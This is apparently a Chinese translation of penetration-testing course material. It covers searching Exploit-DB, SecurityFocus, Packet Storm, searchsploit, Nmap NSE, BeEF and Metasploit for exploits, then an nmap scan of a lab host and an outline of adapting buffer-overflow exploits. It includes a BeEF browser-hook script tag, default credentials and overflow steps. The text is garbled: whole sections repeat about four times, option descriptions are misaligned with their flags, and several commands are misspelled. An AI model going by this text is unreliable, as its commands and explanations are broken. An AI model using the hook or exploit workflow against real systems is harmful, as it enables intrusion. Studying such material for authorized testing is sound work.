+客户端攻击特别阴险，因为它们利用的是客户端软件（如浏览器）的漏洞，而不是利用服务器软件。这通常涉及某种形式的用户交互和欺骗，以便客户端软件执行恶意代码。
+
+这些向量对攻击者特别有吸引力，因为它们不需要对受害者机器进行直接或可路由的访问。
+
+> ³⁶² (Microsoft, 2019), https://support.microsoft.com/en-us/office/what-is-protected-view-30d77777-7774-4777-9777-7777 ( 文本)
+
+# 攻击性安全
+
+Kali Linux 2.0 渗透测试
+
+利用程序是用低级语言编写的并需要编译，以源代码和二进制格式托管。源代码更容易检查，但在（没有专业技能和工具的情况下）检查起来很复杂，且运行更简单。
+
+如果代码检查或编译太复杂，请使用带有干净快照的漏洞虚拟机或“沙箱”。
+
+### 14.2 搜索利用程序
+
+在渗透测试的信息收集和枚举阶段之后，我们可以对发现的软件进行漏洞交叉检查，尝试找到这些软件的发布利用程序。
+
+# 14.2.1 在线利用资源
+
+各种在线资源托管利用程序并免费向开放。在本节中，我们将介绍三个最流行的在线资源。这些资源通常会对提交的利用程序进行测试，并移除被认为伪造或恶意的代码。
+
+# 14.2.1.1 利用程序数据库 (Exploit Database)
+
+Exploit Database 是由 Offensive Security Maintain的项目。它是通过提交、邮件列表和公共资源收集的公开利用程序存档。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_438_0.png)
+
+图 2.5：利用程序数据库
+
+> 363 (Offensive Security, 2019), https://www.exploit-db.com/
+> 364 (Offensive Security, 2019), https://www.offensive-security.com/
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+与其他在线资源相比，Exploit Database（漏洞利用数据库）偶尔会出于研究目的提供受影响软件版本的安装程序。当安装程序可用时，网站上会用一个图标标记，如图 255 的 A 列中显示的下载框图标所示。
+
+Exploit Database 的更新通过 Twitter 馈 965 发布，同时也提供 RSS 馈送 966。
+
+## 14.2.1.2 SecurityFocus 漏洞利用存档
+
+SecurityFocus Exploit Archives 367 网站创建于 1999 年，专注于关注安全社区的几个关键领域。
+
+- BugTraq：一个全公开披露的邮件列表，目的是讨论和发布安全漏洞。
+- SecurityFocus 漏洞数据库：提供所有平台和服务的最新漏洞信息。
+- SecurityFocus 邮件列表：基于主题的邮件列表允许全球范围内的研究人员讨论各种安全问题。
+
+> 365 (Twitter, 2019), https://twitter.com/exploitdb
+> 366 (Offensive Security, 2019), https://www.exploit-db.com/rss.xml
+> 367 (SecurityFocus, 2019), https://www.securityfocus
+
+## 漏洞
+
+- Radiant CVE-2018-7261 多处 HTML 注入漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103080
+- Drupal DRUPAL-SA-CORE-2018-001 多处安全漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103117
+- Drupal DRUPAL-SA-CORE-2018-0011 多处访问绕过漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103115
+- Cisco Unified Communications Manager CVE-2018-0124 远程代码执行漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103114
+- Cisco Elasticast Services Controller Software CVE-2018-0121 身份验证绕过漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103113
+- Juniper Jun 2-Web Interface CVE-2018-0001 远程代码执行漏洞
+  2018-02-24
+  http://www.securityfocus.com/bid/103062
+- Apple iOS/watchOS/macOS/tvOS CVE-2018-4124 拒绝服务漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103068
+- phpMyAdmin CVE-2018-7260 跨站脚本漏洞
+  2018-02-21
+  http://www.securityfocus.com/bid/103099
+- ABB netCADOCS Web Application CVE-2018-5477 信息泄露漏洞
+  2018-02-20
+  http://www.securityfocus.com/bid/103093
+- Linux Kernel `/drivers/block/floppy.c` 本地绕过漏洞
+  2018-02-22
+  http://www.securityfocus.com/bid/103088
+
+搜索所有漏洞。
+
+## 邮件列表
+
+请勾选您想要订阅或取消订阅的列表。如果您已经订阅了 SecurityFocus 邮件列表，在订阅额外列表时，无需勾选这些列表。
+
+邮箱地址：
+
+确认地址：
+
+| 订阅 | 取消订阅 |
+| :--- | :--- |
+
+您将收到来自每个列表的确认邮件。SecurityFocus 通过其 Twitter 馈 368 发布更新，同时也提供 RSS 馈送 369。
+
+> 368 (Twitter, 2019), https://twitter.com/securityfocus?lang=en
+> 369 (SecurityFocus, 2019), https://www.securityfocus.com/rss/index.html
+
+## 14.2.1.3 Packet Storm
+
+Packet Storm 70 建立于 1998 年。它提供安全新闻和漏洞的最新信息，以及安全供应商近期发布的工具。
+
+### 渗透最新文件
+
+| 全部 | 漏洞利用程序 | 白皮书 | 其他 |
+| :--- | :--- | :--- | :--- |
+
+### Hashcat 高级密码恢复
+
+截至 2016 年 2 月，Hashcat 是一种高级的哈希工具，它利用了世界上最快的 GPU 引擎，专注于高迭代哈希、字典攻击等。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+这些选项允许我们缩小搜索范围、更改格式、更新数据库等：
+
+```
+```
+
+
+
+# Options
+
+`-c`, `--case`      `[Term]`
+
+`-e`, `--exact`      `[Term]`
+
+`-h`, `--help`        `[Term]`
+
+`-j`, `--json`        `[EDB-ID]`
+
+`-o`, `--overflow`   `[EDB-ID]`
+
+`-p`, `--path`       `[EDB-ID]`
+
+`-t`, `--title`      `[Term]`
+
+`-u`, `--update`      `[Term]`
+
+`-w`, `--www`         `[Term]`
+
+`-x`, `--execute`     `[EDB-ID]`
+
+`--colour`
+
+`--id`
+
+`--nmap`           `[file.xml]`
+
+`--exclude='term'`
+
+- 执行区分大小写的搜索（默认为不区分大小写）
+- 在屏幕上执行精确匹配（默认为 []）
+显示此屏幕。
+- 以 JSON 格式显示结果。
+- 镜像（别名复制）到当前工作目录
+- 允许漏洞标题溢出列宽
+- 显示漏洞的完整路径（并复制）
+- 搜索漏洞标题（默认为标题）以及
+- 检查是否安装了任何 exploitdb 软件包（更新或）
+- 显示 Exploit-db 的 URL 而非本地路径。
+- 使用 spider （别名复制）漏洞
+- 禁用搜索结果中的高亮。
+- 显示 E-ID 值而非本地路径。
+- 检查 Nmap XML 输出中所有带有服务版本的的结果
+- 使用 `-v`（详细）尝试更多组合
+- 使用 `" "` 分隔大小写来移除结果，例如 `--exclude='term|term|term|term'`
+
+列表 411：搜索选项帮助菜单
+
+最后，菜单中的“Notes（备注）”搜索显示了实用的搜索提示：
+
+## Notes
+
+* 您可以使用任意数量的搜索词。
+* 搜索词不区分大小写（默认情况下），顺序不重要。
+* 如果您希望通过区分大小写的搜索来减少结果，请使用 `'-c'`。
+* 如果您希望通过使用精确匹配过滤结果，请使用 `'-e'`。
+* 在搜索数字（即版本）时使用 `'-t'` 排除文件路径。
+* 在搜索数字时移除假正例（异常）--
+* 在更新或显示帮助时，将识别搜索词。
+
+列表 412：`searchploit` 帮助备注
+
+例如，我们可以使用以下语法搜索针对操作系统上 SMB 服务的所有远程漏洞：
+
+```
+kali@~$ search exploit remote microsoft windows
+```
+
+| 漏洞标题 | 路径 |
+| --- | --- |
+| Microsoft DNS RPC Service - 'extractQ' | exploits/remote/16336.rb |
+| Microsoft Windows - 'srv2.sys' SMB Cod | exploits/remote/40280.rb |
+| Microsoft Windows - 'srv2.sys' SMB Neg | exploits/remote/14674.txt |
+| Microsoft Windows - 'srv2.sys' SMB Neg | exploits/remote/16336.rb |
+| Microsoft Windows - SMB Relay Code Ex | exploits/remote/13360.rb |
+| Microsoft Windows - SmbRelay3 NTLM | exploits/remote/7125.txt |
+| Microsoft Windows - Unauthenticated SMB | exploits/dos/41891.rb |
+| Microsoft Windows 2000/XP | exploits/remote/20.txt |
+| Microsoft Windows 2003 SP2 - 'ERRATIC' | exploits/windows/remote/41929.py |
+| Microsoft Windows 95/Workgroups for XP | exploits/windows/remote/20371.py |
+| Microsoft NT 4.8 SP2 / | exploits/windows/remote/31997.py |
+| Microsoft Windows Server 2008 R2 (x86) | exploits/windows/remote/41887.py |
+| Microsoft Windows Vista/7 - SMB2.0 | exploits/windows/dos/9594.txt |
+| Microsoft Windows 7/8.1/2008 R2 (x)4 | exploits/windows/x86-64/remote/42031.py |
+| Microsoft Windows 7/8.1/2012 R | exploits/windows/x86-64/remote/42315.py |
+| Shellcode: No Result | |
+
+列表 413：使用 search 列出可用的远程 SMB 脚本
+
+Nmap 是最流行的枚举工具之一。该工具的一个强大功能是 Nmap 脚本引擎（NSE），正如其名称所示，它引入了使用脚本自动执行各种任务的能力。Nmap 脚本引擎带有各种用于枚举、暴力破解、检测以及利用的脚本。Nmap 脚本引擎提供的完整脚本列表可以在 `/usr/share/nmap/get` 下找到。使用 `grep` 在 Nmap 脚本中搜索“exploit（利用）”一词会返回多个结果：
+
+```
+kali@~$ cd /usr/share/nmap/scripts
+
+kali@~$ grep *.nse
+```
+
+- `exploit-exec.nse`: clamAV 服务器易受未经身份验证的命令执行影响。
+- `awstats-nse`: Awstats 中的远程代码执行漏洞。
+- `axis-dir-traversal.nse`: Apache 中的目录遍历漏洞。
+- `fileupload-nse`: Web 应用中不安全表单。
+
+列表 414：使用包含“exploit”单词的 NSE 脚本
+
+我们可以通过运行带有 `--help` 后接脚本名称的 `nmap` 来列出脚本信息：
+
+```
+kali@~$ nmap --help exploit-exec.nse
+```
+
+- `exploit-exec.nse`: 易受未经身份验证的命令执行影响的 clamAV 服务器。
+- `awstats-nse`: Awstats 中的远程代码执行漏洞。
+- `axis-dir-traversal.nse`: Apache 中的目录遍历漏洞。
+- `fileupload-nse`: Web 应用中不安全表单。
+
+我们可以通过运行带有 `--help` 后接脚本名称的 `nmap` 来列出脚本信息：
+
+```
+kali@~$ nmap --help exploit-exec.nse
+```
+
+- `exploit-exec.nse`: 易受未经身份验证的命令执行影响的 clamAV 服务器。
+- `awstats-nse`: Awstats 中的远程代码执行漏洞。
+- `axis-dir-traversal.nse`: Apache 中的目录遍历漏洞。
+- `fileupload-nse`: Web 应用中不安全表单。
+
+这种未经身份验证的命令执行会影响 clamAV 服务器的漏洞。
+
+参考：
+* https://twitter.com/status/7406735078647698
+* https://bugzilla.net/show_bug.cgi?id=1585
+
+列表 415：使用 NSE 脚本获取信息
+
+这提供了关于漏洞和外部资源的信息。
+
+## 浏览器执行框架 (BeEF)
+
+浏览器执行框架 (BeEF) 是一种专注于在 Web 浏览器中执行攻击的渗透测试工具。无需解释，它包含了大量的漏洞。
+
+为了列出可用的漏洞，我们必须首先启动服务。这在 Kali Linux 中可以使用 `beef-xss` 命令完成：
+
+```
+kal@kali:~ sudo beef-xss
+```
+
+* 请等待 BeEF 服务启动。
+
+* 在打开浏览器之前您可能需要刷新。
+
+* UI: http://127.0.0.1:3000/ui/panel
+
+* 钩子: `<script src="http://127.0.0.1:3000/hook.js"></script>`
+
+* 示例: `<script src="http://127.0.0.1:3000/hook.js"></script>`
+
+
+
+列表 416：在 Kali Linux 中启动 BeEF 服务
+
+我们可以使用默认密码 `beef/beef` 访问 `http://127.0.0.1:3000/ui/panel` 并登录框架的主界面。
+
+| 身份验证 |  |
+|---|---|
+| 用户名: | beef |
+| 密码: | **** |
+
+图 258：BeEF 主登录页面
+
+登录后，我们需要挂钩（hook）一个目标浏览器。由于高级挂钩超出了本模块的范围，我们将通过点击高亮的演示页面链接使用框架提供的演示页面。这将允许 BeEF 挂钩我们的浏览器。
+
+## 已挂钩浏览器
+
+一旦浏览器被挂钩，它将出现在左侧的“挂钩浏览器（Hooked Browsers）”面板中。根据它们请求框架的时间，挂钩浏览器将显示在线或离线状态。
+
+# 攻击性安全
+www.offensivesecurity.com
+
+Kali Linux 2.0 渗透测试
+
+## 14.2.2.4 Metasploit 框架
+
+```
+kali@kali:~ sudo msfconsole -q
+```
+
+列表 417 - 启动 Metasploit 框架
+
+该框架的使用将在另一个模块中介绍，因此我们将简单地关注于使用 `search` 命令列出框架内的漏洞利用程序（exploits）。
+
+为了进行演示，请考虑对流行的 MS08_067 漏洞进行如下搜索：
+
+```
+msf > search ms08_067
+```
+
+### 匹配模块
+
+| Name | Disclosure Date | Description |
+|---|---|---|
+| exploit/windows/smb/ms08_067_netapi | 2008-10-28 | MS08_067 Microsoft Server Relative Path Stack Corruption |
+
+列表 418 - 在 Metasploit 中搜索 ms08_067 漏洞
+
+> ^376 (Rapid, 2019), https://www.metasploit.com
+> ^377 (Microsoft, 2019), https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+
+Metasploit 搜索命令包含许多关键词，帮助我们找到特定的漏洞利用程序。
+要列出所有选项，请配合 `-h` 选项运行 `search`：
+
+```
+msf5 > search -h
+
+Usage: search [ options ] <keywords>
+```
+
+OPTIONS：
+
+- `-h` 显示帮助信息
+- `-o <file>` 将输出发送到 csv 格式的文件
+- `-S <string>` 用于行过滤的搜索字符串
+- `-u` 如果只有一个结果，则使用该模块
+
+关键词：
+
+- `aka` 具有匹配 AKA（别名）名称的模块
+- `author` 由此作者编写的模块
+- `arch` 影响此架构的模块
+- `bid` 具有匹配 Bugtrag ID 的模块
+- `cve` 具有匹配 Exploit ID（漏洞利用程序标识符）的模块
+- `edb` 支持 'check' 方法的模块
+- `check` 具有匹配发布日期的模块
+- `date` 具有匹配描述的模块
+- `full_name` 具有匹配全称的模块
+- `mod_time` 具有匹配修改日期的模块
+- `name` 具有匹配性名称的模块
+- `path` 具有匹配路径的模块
+- `platform` 影响此平台的模块
+- `port` 具有匹配端口的模块
+- `rank` 具有匹配排名（可以是描述性的：如 'good'）或名称的模块
+- `ref` 具有匹配 ref 的模块
+- `reference` 具有匹配引用的模块
+- `target` 影响此目标的模块
+- `type` 特定类型的模块（exploit, payload, auxiliary, encoder, we）
+
+示例：
+`search cve:2009 type`
+
+## 14.3 整合实战
+
+在涵盖了所有资源后，让我们演示一下在真实场景中将会是。我们将攻击专用 Linux 内核，该内核托管了一个存在公共漏洞的应用。
+
+我们通过运行 `nmap` 开始枚举过程，以确定机器向网络暴露了哪些服务：
+
+```
+kali@kali:~ sudo nmap 10.11.0.128 -p - -sV -vv --open --reason
+
+...
+Scanning 10.11.0.128 [ports]
+
+Discovered open port 3389/tcp on 10.11.0.128
+
+Discovered open port 118/tcp on 10.11.0.128
+
+Discovered open port 25/tcp on 10.11.0.128
+
+Discovered open port 22/tcp on 10.11.0.128
+```
+
+Discovered open port 119/tcp on 10.11.0.128
+Discovered open port 4555/tcp on 10.11.0.128
+Completed SYN Stealth Scan at 14:23, 49.03s elapsed (65535 total ports)
+Initiating scan at 14:22
+Scanning 6 services on 10.11.0.128
+Completed scan at 14:23, 11.47s elapsed (6 services on 1 host)
+NSE: Script scanning 10.11.0.128.
+
+Nmap scan report for 10.11.0.128
+Host is up, received arp-response (0.15s latency).
+Scanned from 2019-04-13 14:22:57 EEST for 6 hosts
+Not shown: 65304 closed ports, 225 filtered ports
+Reason: 65534 requests and 220 non-responses
+
+某些关闭的端口被报告为过滤，由于 ---defeat-ratelimit
+
+| PORT | STATE | REASON | VERSION |
+|---|---|---|---|
+| 22/tcp | open | | |
+| 25/tcp | open | | |
+| 118/tcp | open | | |
+| 119/tcp | open | | |
+| 3389/tcp | open | | |
+| 4555/tcp | open | | |
+
+
+
+# 攻击性安全
+www.offensivesecurity.com
+
+Kali Linux 2.0 渗透测试
+
+## 14.2.2.4 Metasploit 框架
+
+```
+kali@kali:~ sudo msfconsole -q
+```
+
+列表 417 - 启动 Metasploit 框架
+
+该框架的使用将在另一个模块中介绍，因此我们将简单地关注于使用 `search` 命令列出框架内的漏洞利用程序。
+
+为了进行演示，请考虑对流行的 MS08_067 漏洞进行如下搜索：
+
+```
+msf > search ms08_067
+```
+
+### 匹配模块
+
+| Name | Disclosure Date | Description |
+|---|---|---|
+| exploit/windows/smb/ms08_067_netapi | 2008-10-28 | MS08_067 Microsoft Server Relative Path Stack Corruption |
+
+列表 418 - 在 Metasploit 中搜索 ms08_067 漏洞
+
+> ^376 (Rapid, 2019), https://www.metasploit.com
+> ^377 (Microsoft, 2019), https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+
+Metasploit 搜索命令包含许多关键词，帮助我们找到特定的漏洞利用程序。
+要列出所有选项，请配合 `-h` 选项运行 `search`：
+
+```
+msf5 > search -h
+
+Usage: search [ options ] <keywords>
+```
+
+OPTIONS：
+
+- `-h` 显示帮助信息
+- `-o <file>` 将输出发送到 csv 格式的文件
+- `-S <string>` 用于行过滤的搜索字符串
+- `-u` 如果只有一个结果，则使用该模块
+
+关键词：
+
+- `aka` 具有匹配 AKA（别名）名称的模块
+- `author` 由此作者编写的模块
+- `arch` 影响此架构的模块
+- `bid` 具有匹配 Bugtrag ID 的模块
+- `cve` 具有匹配 Exploit ID（漏洞利用程序标识符）的模块
+- `edb` 支持 'check' 方法的模块
+- `check` 具有匹配发布日期的模块
+- `date` 具有匹配描述的模块
+- `full_name` 具有匹配全称的模块
+- `mod_time` 具有匹配修改日期的模块
+- `name` 具有匹配性名称的模块
+- `path` 具有匹配路径的模块
+- `platform` 影响此平台的模块
+- `port` 具有匹配端口的模块
+- `rank` 具有匹配排名（可以是描述性的：如 'good'）或名称的模块
+- `ref` 具有匹配 ref 的模块
+- `reference` 具有匹配引用的模块
+- `target` 影响此目标的模块
+- `type` 特定类型的模块（exploit, payload, auxiliary, encoder, we）
+
+示例：
+`search cve:2009 type`
+
+## 14.3 整合实战
+
+在涵盖了所有资源后，让我们演示一下在真实场景中将会是。。我们将攻击我们的专用的 Linux 内核，该内核托管了一个存在公共漏洞的应用。
+
+我们通过运行 `nmap` 开始枚举过程，以确定机器向网络暴露了哪些服务：
+
+```
+kali@kali:~ sudo nmap 10.11.0.128 -p - -sV -vv --open --reason
+
+...
+
+Scanning 10.11.0.128 [ports]
+
+Discovered open port 3389/tcp on 10.11.0.128
+
+Discovered open port 118/tcp on 10.11.0.128
+
+Discovered open port 25/tcp on 10.11.0.128
+
+Discovered open port 22/tcp on 10.11.0.128
+```
+
+
+
+```
+Discovered open port 119/tcp on 10.11.0.128
+Discovered open port 4555/tcp on 10.11.0.128
+Completed SYN Stealth Scan at 14:23, 49.03s elapsed (65535 total ports)
+Initiating scan at 14:22
+Scanning 6 services on 10.11.0.128
+Completed scan at 14:23, 11.47s elapsed (6 services on 1 host)
+NSE: Script scanning 10.11.0.128.
+
+Nmap scan report for 10.11.0.128
+Host is up, received arp-response (0.15s latency).
+Scanned from 2019-04-13 14:22:57 EEST for 6 hosts
+Not shown: 65304 closed ports, 225 filtered ports
+Reason: 65534 requests and 220 non-responses
+
+某些关闭的端口被报告为过滤，由于 ---defeat-ratelimit
+
+| PORT | STATE | REASON | VERSION |
+|---|---|---|---|
+| 22/tcp | open | | |
+| 25/tcp | open | | |
+| 118/tcp | open | | |
+| 119/tcp | open | | |
+| 3389/tcp | open | | |
+| 4555/tcp | open | | |
+
+# 攻击性安全
+www.offensivesecurity.com
+
+Kali Linux 2.0 渗透测试
+
+## 14.2.2.4 Metasploit 框架
+
+```
+kali@kali:~ sudo msfconsole -q
+```
+
+列表 417 - 启动 Metasploit 框架
+
+该框架的使用将在另一个模块中介绍，因此我们将简单地关注于使用 `search` 命令列出框架内的漏洞利用程序。
+
+为了进行演示，请考虑对流行的 MS08_067 漏洞进行如下搜索：
+
+```
+msf > search ms08_067
+```
+
+### 匹配模块
+
+| Name | Disclosure Date | Description |
+|---|---|---|
+| exploit/windows/smb/ms08_067_netapi | 2008-10-28 | MS08_067 Microsoft Server Relative Path Stack Corruption |
+
+列表 418 - 在 Metasploit 中搜索 ms08_067 漏洞
+
+> ^376 (Rapid, 2019), https://www.metasploit.com
+^377 (Microsoft, 2019), https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+
+Metasploit 搜索命令包含许多关键词，帮助我们找到特定的漏洞利用程序。
+要列出所有选项，请配合 `-h` 选项运行 `search`：
+
+```
+msf5 > search -h
+
+Usage: search [ options ] <keywords>
+```
+
+OPTIONS：
+
+- `-h` 显示帮助信息
+- `-o <file>` 将输出发送到 csv 格式的文件
+- `-S <string>` 用于行过滤的搜索字符串
+- `-u` 如果只有一个结果，则使用该模块
+
+关键词：
+
+- `aka` 具有匹配 AKA（别名）名称的模块
+- `author` 由此作者编写的模块
+- `arch` 影响此架构的模块
+- `bid` 具有匹配 Bugtrag ID 的模块
+- `cve` 具有匹配 Exploit ID（漏洞利用程序标识符）的模块
+- `edb` 支持 'check' 方法的模块
+- `check` 具有匹配发布日期的模块
+- `date` 具有匹配描述的模块
+- `full_name` 具有匹配全称的模块
+- `mod_time` 具有匹配修改日期的模块
+- `name` 具有匹配性名称的模块
+- `path` 具有匹配路径的模块
+- `platform` 影响此平台的模块
+- `port` 具有匹配端口的模块
+- `rank` 具有匹配排名（可以是描述性的：如 'good'）或名称的模块
+- `ref` 具有匹配 ref 的模块
+- `reference` 具有匹配引用的模块
+- `target` 影响此目标的模块
+- `type` 特定类型的模块（exploit, payload, auxiliary, encoder, we）
+
+示例：
+`search cve:2009 type`
+
+## 14.3 整合实战
+
+在涵盖了所有资源后，让我们演示一下在真实场景中将会是。。我们将攻击我们的专用的 Linux 内核，该内核托管了一个存在公共漏洞的应用。
+
+我们通过运行 `nmap` 开始枚举过程，以确定机器向网络暴露了哪些服务：
+
+```
+kali@kali:~ sudo nmap 10.11.0.128 -p - -sV -vv --open --reason
+...
+
+Scanning 10.11.0.128 [ports]
+
+Discovered open port 3389/tcp on 10.11.0.128
+
+Discovered open port 118/tcp on 10.11.0.128
+
+Discovered open port 25/tcp on 10.11.0.128
+
+Discovered open port 22/tcp on 10.11.0.128
+```
+
+
+
+Discovered open port `119/tcp` on `10.11.0.128`
+Discovered open port `4555/tcp` on `10.11.0.128`
+Completed SYN Stealth Scan at 14:23, 49.03s elapsed (65535 total ports)
+Initiating scan at 14:22
+Scanning 6 services on `10.11.0.128`
+Completed scan at 14:23, 11.47s elapsed (6 services on 1 host)
+NSE: Script scanning `10.11.0.128`.
+
+Nmap scan report for `10.11.0.128`
+Host is up, received arp-response (0.15s latency).
+Scanned from 2019-04-13 14:22:57 EEST for 6 hosts
+Not shown: 65304 closed ports, 225 filtered ports
+Reason: 65534 requests and 220 non-responses
+
+某些关闭的端口被报告为过滤，由于 `---defeat-ratelimit`
+
+| PORT | STATE | REASON | VERSION |
+|---|---|---|---|
+| 22/tcp | open | | |
+| 25/tcp | open | | |
+| 118/tcp | open | | |
+| 119/tcp | open | | |
+| 3389/tcp | open | | |
+| 4555/tcp | open | | |
+
+# 攻击性安全
+www.offensivesecurity.com
+
+Kali Linux 2.0 渗透测试
+
+## 14.2.2.4 Metasploit 框架
+
+```
+kali@kali:~ sudo msfconsole -q
+```
+
+列表 417 - 启动 Metasploit 框架
+
+该框架的使用将在另一个模块中介绍，因此我们将简单地关注于使用 `search` 命令列出框架内的漏洞利用程序。
+
+为了进行演示，请考虑对流行的 MS08_067 漏洞进行如下搜索：
+
+```
+msf > search ms08_067
+```
+
+### 匹配模块
+
+| Name | Disclosure Date | Description |
+|---|---|---|
+| exploit/windows/smb/ms08_067_netapi | 2008-10-28 | MS08_067 Microsoft Server Relative Path Stack Corruption |
+
+列表 418 - 在 Metasploit 中搜索 ms08_067 漏洞
+
+> ^376 (Rapid, 2019), https://www.metasploit.com
+^377 (Microsoft, 2019), https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+
+Metasploit 搜索命令包含许多关键词，帮助我们找到特定的漏洞利用程序。
+要列出所有选项，请配合 `-h` 选项运行 `search`：
+
+```
+msf5 > search -h
+
+Usage: search [ options ] <keywords>
+```
+
+OPTIONS：
+
+- `-h` 显示帮助信息
+- `-o <file>` 将输出发送到 csv 格式的文件
+- `-S <string>` 用于行过滤的搜索字符串
+- `-u` 如果只有一个结果，则使用该模块
+
+关键词：
+
+- `aka` 具有匹配 AKA（别名）名称的模块
+- `author` 由此作者编写的模块
+- `arch` 影响此架构的模块
+- `bid` 具有匹配 Bugtrag ID 的模块
+- `cve` 具有匹配 Exploit ID（漏洞利用程序标识符）的模块
+- `edb` 支持 'check' 方法的模块
+- `check` 具有匹配发布日期的模块
+- `date` 具有匹配描述的模块
+- `full_name` 具有匹配全称的模块
+- `mod_time` 具有匹配修改日期的模块
+- `name` 具有匹配性名称的模块
+- `path` 具有匹配路径的模块
+- `platform` 影响此平台的模块
+- `port` 具有匹配端口的模块
+- `rank` 具有匹配排名（可以是描述性的：如 'good'）或名称的模块
+- `ref` 具有匹配 ref 的模块
+- `reference` 具有匹配引用的模块
+- `target` 影响此目标的模块
+- `type` 特定类型的模块（exploit, payload, auxiliary, encoder, we）
+
+示例：
+`search cve:2009 type`
+
+## 14.3 整合实战
+
+在涵盖了所有资源后，让我们演示一下在真实场景中将会是。。我们将攻击攻击我们的专用的 Linux 内核，该内核托管了一个存在公共漏洞的应用。
+
+我们通过运行 `nmap` 开始枚举过程，以确定机器向网络暴露了哪些服务：
+
+```
+kali@kali:~ sudo nmap 10.11.0.128 -p - -sV -vv --open --reason
+...
+Scanning 10.11.0.128 [ports]
+
+Discovered open port 3389/tcp on 10.11.0.128
+
+Discovered open port 118/tcp on 10.11.0.128
+
+Discovered open port 25/tcp on 10.11.0.128
+
+Discovered open port 22/tcp on 10.11.0.128
+```
+
+
+
+Discovered open port 119/tcp on 10.11.0.128
+Discovered open port 4555/tcp on 10.11.0.128
+Completed SYN Stealth Scan at 14:23, 49.03s elapsed (65535 total ports)
+Initiating scan at 14:22
+Scanning 6 services on 10.11.0.128
+Completed scan at 14:23, 11.47s elapsed (6 services on 1 host)
+NSE: Script scanning 10.11.0.128.
+
+Nmap scan report for 10.11.0.128
+Host is up, received arp-response (0.15s latency).
+Scanned from 2019-04-13 14:22:57 EEST for 6 hosts
+Not shown: 65304 closed ports, 225 filtered ports
+Reason: 65534 requests and 220 non-responses
+
+某些关闭的端口被报告为过滤，由于 `---defeat-ratelimit`
+
+| PORT | STATE | REASON | VERSION |
+|---|---|---|---|
+| 22/tcp | open | | |
+| 25/tcp | open | | |
+| 118/tcp | open | | |
+| 119/tcp | open | | |
+| 3389/tcp | open | | |
+| 4555/tcp | open | | |
+
+## 15. 修复漏洞 (Fixing Exploits)
+
+从零开始编写漏洞利用可能困难且耗时。但在执行过程中，寻找一个完全符合我们特定需求的公开漏洞可能同样困难且耗时。一个极好的折中方案是修改公开漏洞以适应我们的特定需求。
+
+然而，这种方案也面临挑战。对于像缓冲区溢出这样的内存损坏型漏洞，我们可能需要修改二进制目标参数，例如 socket 信息、返回地址、有效负载（payload）和偏移量（offsets）。
+
+理解这些每一个元素都非常重要。例如，如果我们的目标运行的是 Windows 2008 Server，而我们尝试运行一个针对 Windows 2003 Server 测试的漏洞程序，像 ASLR 这样的保护机制极有可能导致应用程序崩溃，这可能会导致该向量在一段时间内失效，或影响生产环境，这两种情况都是我们应该避免的。
+
+考虑到这些，与其修复一个不匹配的漏洞程序，我们应该始终仔细仔细阅读代码，根据需要进行修改，并尽可能针对我们的沙箱目标进行测试。
+
+> 这些变量解释了为什么像 Exploit Database 这样的在线资源会对同一个漏洞提供多个利用程序，每个程序都是为不同的目标操作系统和架构编写的。
+
+我们可能还可以通过将漏洞程序移植到不同的语言来获益，以便包含额外的预写库，并通过将其导入攻击框架来扩展漏洞程序的功能。
+
+最后，编写为在特定操作系统和架构上运行的漏洞可能需要移植到不同的平台。例如，我们经常遇到这样的情况：漏洞程序需要在 Windows 上编译，但我们又想在 Kali 上运行它。
+
+在本模块中，我们将通过演示修改公开漏洞代码以适应特定平台和目标的步骤，来克服这些许多挑战。我们将同时探索内存损坏型漏洞和 Web 型漏洞。
+
+## 15.1 修复内存损坏型漏洞
+
+内存损坏型漏洞（如缓冲区溢出）相对复杂，且难以修改。在进入示例之前，我们应该讨论一下该过程，并重点介绍我们将面临的一些考虑因素和挑战。
+
+### 概述与考虑因素
+
+### 15.1.1
+
+标准栈溢出（在没有 DEP 和 ASLR 等防护的用户模式下运行的应用程序中）的通用流程非常直接。该利用程序的流程如下：
+
+- 创建一个大缓冲区以触发溢出。
+- 通过在大缓冲区中填充适当的偏移量来覆盖栈上的返回地址，从而接管 EIP 的控制权。
+- 在缓冲区中包含选定的 payload，前面带有一个可选的 NOP 滑块（NOP sled）。
+- 选择正确的返回指令，例如 JMP ESP（或其他寄存器），以便将执行流重定向到我们的 payload 中。
+
+此外，当我们修复漏洞程序时，取决于漏洞本身，我们可能需要修改已部署缓冲区的元素以适应目标，例如文件路径、IP 地址和端口、URL 等。如果这些修改更改了漏洞程序，我们必须调整缓冲区长度，以确保我们用所需的字节覆盖返回地址。
+
+虽然我们可以自己找到漏洞程序使用的返回地址，但更合理的替代方案是（特别是该地址不是漏洞应用程序或其 DLL 部分时），此此最可靠的方法之一是在虚拟机中本地克隆目标环境，然后在漏洞软件上使用调试器获取返回地址指令的内存。
+
+我们还必须考虑原始漏洞代码中包含的 payload。
+
+正如在之前的模块中提到的，公开漏洞具有固有的危险，因为它们通常包含十六进制编码的 payload，必须对其进行逆向工程以确定其工作原理。正因如此，我们必须始终检查公开漏洞中使用的 payload，或者更好是插入我们自己的。
+
+当我们这样做时，显然显然会包含自己的 IP 地址和端口号，并可能排除坏字符（bad characters），这些字符我们可以自己确定或从漏洞注释中获取。
+
+虽然建议在任何时候生成漏洞程序，但某些漏洞使用了自定义 payload，这对于成功攻破漏洞应用程序至关重要。如果是如此，我们唯一的选择就是逆向工程 payload 以确定其功能以及执行它是否安全。这是困难的，并且超出了本模块的范围，因此我们将重点关注 shellcode 的替换。
+
+在重新利用漏洞程序时，必须将所有这些因素考虑在内。
+
+### 15.1.2 导入并检查漏洞程序
+
+在示例中，我们将像在之前的模块中一样针对 Sync Breeze Enterprise 10.0.0.28，但我们将关注于一个不同的漏洞程序。这将为我们的目标环境提供另一个可用的漏洞程序，并允许我们演示修改过程。
+
